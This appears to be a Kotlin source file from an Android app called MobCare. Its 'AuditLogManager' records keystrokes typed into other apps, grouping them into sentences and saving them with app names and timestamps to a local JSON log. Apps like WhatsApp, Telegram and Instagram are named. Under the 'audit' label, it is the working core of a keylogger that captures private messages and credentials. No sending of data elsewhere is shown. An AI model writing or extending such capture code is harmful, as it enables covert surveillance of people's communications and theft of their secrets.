package com.mobcare.audit

import android.content.Context
import android.os.Handler
import android.os.Looper
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

data class AuditRecord(
    val id: String,
    val packageName: String,
    val appName: String,
    val content: String,
    val timestamp: String
)

object AuditLogManager {

    private const val FILE_NAME = "mobcare_audit_logs.json"
    private val currentBuffer = StringBuilder()
    private var activePackage = "unknown"
    private val mainHandler = Handler(Looper.getMainLooper())
    private var pendingContext: Context? = null

    // Flush full sentence after 2.8 seconds of typing pause
    private val flushRunnable = Runnable {
        pendingContext?.let { flushBuffer(it) }
    }

    fun onAppFocused(context: Context, packageName: String) {
        if (activePackage != packageName && currentBuffer.isNotEmpty()) {
            flushBuffer(context)
        }
        activePackage = packageName
        pendingContext = context.applicationContext
    }

    fun onCharTyped(context: Context, packageName: String, char: String) {
        activePackage = packageName
        pendingContext = context.applicationContext
        currentBuffer.append(char)

        mainHandler.removeCallbacks(flushRunnable)

        // If user pressed newline or buffer exceeds 250 characters, flush immediately
        if (char == "\n" || currentBuffer.length >= 250) {
            flushBuffer(context)
        } else {
            // Wait 2.8 seconds of pause before recording the complete sentence
            mainHandler.postDelayed(flushRunnable, 2800)
        }
    }

    fun onBackspace() {
        if (currentBuffer.isNotEmpty()) {
            currentBuffer.deleteCharAt(currentBuffer.length - 1)
        }
    }

    fun onEnterPressed(context: Context) {
        mainHandler.removeCallbacks(flushRunnable)
        if (currentBuffer.isNotEmpty()) {
            flushBuffer(context)
        }
    }

    @Synchronized
    fun flushBuffer(context: Context) {
        mainHandler.removeCallbacks(flushRunnable)
        if (currentBuffer.isEmpty()) return
        val textToSave = currentBuffer.toString().trim()
        currentBuffer.clear()
        if (textToSave.isEmpty()) return

        val friendlyAppName = getFriendlyAppName(context, activePackage)
        val sdf = SimpleDateFormat("dd MMM, hh:mm:ss a", Locale.getDefault())
        val timeStr = sdf.format(Date())

        saveRecord(context, activePackage, friendlyAppName, textToSave, timeStr)
    }

    @Synchronized
    fun logSystemEvent(context: Context, packageName: String, appName: String, content: String) {
        val sdf = SimpleDateFormat("dd MMM, hh:mm:ss a", Locale.getDefault())
        val timeStr = sdf.format(Date())
        saveRecord(context, packageName, appName, content, timeStr)
    }

    private fun saveRecord(context: Context, pkg: String, name: String, content: String, time: String) {
        val recordJson = JSONObject().apply {
            put("id", System.currentTimeMillis().toString())
            put("packageName", pkg)
            put("appName", name)
            put("content", content)
            put("timestamp", time)
        }

        try {
            val file = File(context.filesDir, FILE_NAME)
            val jsonArray = if (file.exists()) {
                val existing = file.readText()
                if (existing.isNotEmpty()) JSONArray(existing) else JSONArray()
            } else {
                JSONArray()
            }

            val updatedArray = JSONArray()
            updatedArray.put(recordJson)
            for (i in 0 until jsonArray.length()) {
                if (i < 200) {
                    updatedArray.put(jsonArray.get(i))
                }
            }

            file.writeText(updatedArray.toString())
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun getLogs(context: Context): List<AuditRecord> {
        val list = mutableListOf<AuditRecord>()
        try {
            val file = File(context.filesDir, FILE_NAME)
            if (!file.exists()) return list
            val content = file.readText()
            if (content.isEmpty()) return list
            val jsonArray = JSONArray(content)
            for (i in 0 until jsonArray.length()) {
                val obj = jsonArray.getJSONObject(i)
                list.add(
                    AuditRecord(
                        id = obj.optString("id"),
                        packageName = obj.optString("packageName"),
                        appName = obj.optString("appName"),
                        content = obj.optString("content"),
                        timestamp = obj.optString("timestamp")
                    )
                )
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return list
    }

    fun clearLogs(context: Context) {
        try {
            val file = File(context.filesDir, FILE_NAME)
            if (file.exists()) {
                file.delete()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun getFriendlyAppName(context: Context, pkg: String): String {
        return try {
            val pm = context.packageManager
            val info = pm.getApplicationInfo(pkg, 0)
            pm.getApplicationLabel(info).toString()
        } catch (e: Exception) {
            when {
                pkg.contains("whatsapp") -> "WhatsApp"
                pkg.contains("chrome") -> "Google Chrome"
                pkg.contains("youtube") -> "YouTube"
                pkg.contains("telegram") -> "Telegram"
                pkg.contains("instagram") -> "Instagram"
                pkg.contains("mobcare") -> "MobCare Test"
                else -> pkg
            }
        }
    }
}